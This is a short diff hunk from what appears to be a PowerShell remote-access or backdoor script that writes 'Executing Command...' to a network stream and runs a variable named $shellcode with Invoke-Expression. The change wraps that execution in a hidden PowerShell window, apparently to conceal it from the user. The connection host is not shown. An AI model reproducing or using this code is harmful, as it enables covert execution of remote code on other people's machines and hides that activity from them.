@@ -62,7 +62,7 @@ sleep 0.4
 $Writer.WriteLine("Executing Command...")
 $Writer.Flush()
 sleep 1
-iEx $shellcode
+iEx "start powershell -windowstyle hidden -Args $shellcode"
 # Close the connection
 $StreamReader.Close()
 $Stream.Close()
